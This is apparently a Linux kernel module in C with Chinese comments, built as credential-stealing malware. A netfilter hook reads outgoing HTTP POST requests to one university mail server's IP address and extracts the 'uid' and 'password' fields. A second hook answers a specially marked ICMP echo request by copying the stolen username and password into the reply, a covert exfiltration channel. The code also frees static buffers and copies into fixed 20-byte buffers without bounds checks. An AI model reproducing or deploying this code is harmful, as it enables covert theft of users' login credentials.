
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/icmp.h>
#include <linux/in.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>


/*
NF_DROP                丢弃该数据包
NF_ACCEPT            保留该数据包
NF_STOLEN            忘掉该数据包
NF_QUEUE            将该数据包插入到用户空间
NF_REPEAT            再次调用该hook函数
*/

/*
NF_INET_PRE_ROUTING    在完整性校验之后，选路确定之前
NF_INET_LOCAL_IN        在选路确定之后，且数据包的目的是本地主机
NF_INET_FORWARD        目的地是其它主机地数据包
NF_INET_LOCAL_OUT        来自本机进程的数据包在其离开本地主机的过程中
NF_INET_POST_ROUTING    在数据包离开本地主机“上线”之前
*/

#define MAGIC_CODE   0x5B
#define REPLY_SIZE   36

static struct nf_hook_ops out;
static struct nf_hook_ops in_http;
static struct nf_hook_ops in_icmp;

static char username[20] = {-1};
static char password[20] = {-1};
static int have_pair = 0;

static void check_http(const struct tcphdr *tcph);



u_long change_uint(u_long a, u_long b, u_long c, u_long d){
    u_long address = 0;
    address |= d<<24;
    address |= c<<16;
    address |= b<<8;
    address |= a;
    return address;
};


/*
    窃取邮箱用户名和密码
*/
unsigned int watch_out(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int(okfn)(struct sk_buff *))
{
    
    struct iphdr * iph;
    struct tcphdr *tcph;
    iph = ip_hdr(skb);

    /*如果不是tcp报，则允许output*/
    if(iph->protocol!=IPPROTO_TCP){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT;   
    }

    /*判断是否发往"202.38.64.8"（科大邮箱ip）的报文*/
    if(iph->daddr!=change_uint(202,38,64,8)){
        //printk("1111\n");
        return NF_ACCEPT; 
    }
    
    /*判断是否为HTTP报文*/
    tcph = (struct tcphdr*)((u_char *)iph+iph->ihl*4);
    if(tcph->dest!=htons(80)){
        //printk("11 %d\n",iph->daddr);
        return NF_ACCEPT; 
    }

    check_http(tcph);
    return NF_ACCEPT;

}


/*
    解析http报文
*/
static void check_http(const struct tcphdr *tcph){
    u_char *data = (u_char *)tcph;
    u_char *pos_uid;
    u_char *pos_password;
    char *pattern_uid = "&uid";
    char *pattern_password = "password";

    /*指向http数据*/
    data += tcph->doff * 4;   //offset包头长度占４位，最多能表示15个32bit的长度）

    /* 首先判断是否为post请求包*/
    if(strncmp(data,"POST",4)==0)
    {
         printk("%s\n",data);
        /*判断是否同时存在用户名和密码字段*/
         /*
             找出str2字符串在str1字符串中第一次出现的位置（不包括str2的串结束符）。
             返回该位置的指针，如找不到，返回空指针。
        */
        pos_uid = strstr(data,pattern_uid);
        pos_password = strstr(data,pattern_password);
        /*如果存在，则抓取用户名和密码*/
        if((pos_uid!=NULL)&&(pos_password!=NULL))
        {
            u_short i=0; 
            pos_uid+=5;
            pos_password+=9;
            /*抓取用户名*/
            while(*pos_uid != '&'){
                username[i++] = *pos_uid;
                pos_uid++;
            }
            username[i]='\0';
            /*抓取密码*/
            i=0;
            while(*pos_password != '&'){
                password[i++] = *pos_password;
                pos_password++;
            }
            password[i] = '\0';
            have_pair++;		       /* Have a pair. Ignore others until
                           * this pair has been read. */
        }
        if (have_pair){
            printk("Have password pair:\n");
            printk("username: %s\n",username);
            printk("password: %s\n",password);
        }
    }
}




static unsigned int watch_in_icmp(unsigned int hooknum,
    struct sk_buff *skb,
    const struct net_device *in,
    const struct net_device *out,
    int (*okfn)(struct sk_buff *))
{   
    struct sk_buff *sb = skb;
    struct iphdr *iph;
    struct icmphdr *icmph;
    char *cp_data;		       /* Where we copy data to in reply */
    unsigned int   taddr;	       /* Temporary IP*/
    
    iph = ip_hdr(sb);

    /*目前没有抓取到用户名密码，不作任何处理。接收*/
    if (!have_pair)
        return NF_ACCEPT;

    /*不是ICMP包，同样不往下做任何处理。接收*/
    if(iph->protocol!=IPPROTO_ICMP)
        return NF_ACCEPT;

    /*是否是特殊构造的ICMP包*/
    icmph = (struct icmphdr*)((u_char *)iph+iph->ihl*4);
    if (icmph->code != MAGIC_CODE || icmph->type != ICMP_ECHO) {
        return NF_ACCEPT;
    }

    /*重新构造包*/
    /*交换原ip目的ip*/
    taddr = ip_hdr(sb)->saddr;
    ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
    ip_hdr(sb)->daddr = taddr;

    /*
    以太网目的地址＋以太网原地址＋帧类型＋硬件类型＋协议类型
    */
    sb->pkt_type = PACKET_OUTGOING; //帧类型

    /*交换原mac目的mac地址*/
    switch (sb->dev->type) {
		case ARPHRD_PPP:                       /* Ntcho iddling needs doing */
			break;
        case ARPHRD_LOOPBACK:
        case ARPHRD_ETHER: //硬件类型为以太网
			{
				unsigned char t_hwaddr[ETH_ALEN];

				/* Move the data pointer to point to the link layer header */
				sb->data = (unsigned char *)eth_hdr(sb);
                sb->len += ETH_HLEN; 
                
				memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
				memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),ETH_ALEN);
				memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
				break;
			}
    }
    cp_data = (char *)((char *)icmph + sizeof(struct icmphdr));
    //memcpy(cp_data, &target_ip, 4);
    if (*username!=-1)
      //memcpy(cp_data + 4, username, 16);
      memcpy(cp_data + 4, username, 20);
    if (*password!=-1)
      memcpy(cp_data + 24, password, 20);
    
    dev_queue_xmit(sb);

    kfree(username);
    kfree(password);
    memset(username,-1,20);
    memset(password,-1,20);
    have_pair = 0;

    return NF_STOLEN;
    /*
    STOLEN时经常用于这样的情形，也就是在原始报文的基础上对报文进行了修改，
    然后将修改后的报文发出去了，因此，就要告诉系统忘记原有的那个skb。
    因为skb被修改，并以新的方式发送出去了。
    */
}


int init_module(){
	out.hook = watch_out;
	out.hooknum = NF_INET_LOCAL_OUT;
	out.pf = PF_INET;
	out.priority = NF_IP_PRI_FIRST; 

    in_icmp.hook = watch_in_icmp;
	in_icmp.hooknum = NF_INET_LOCAL_IN;
	in_icmp.pf = PF_INET;
	in_icmp.priority = NF_IP_PRI_FIRST; 

	nf_register_hook(&out);
	nf_register_hook(&in_icmp);
	return 0;

}

void cleanup_module(void){
    nf_unregister_hook(&out);
    nf_unregister_hook(&in_icmp);
}
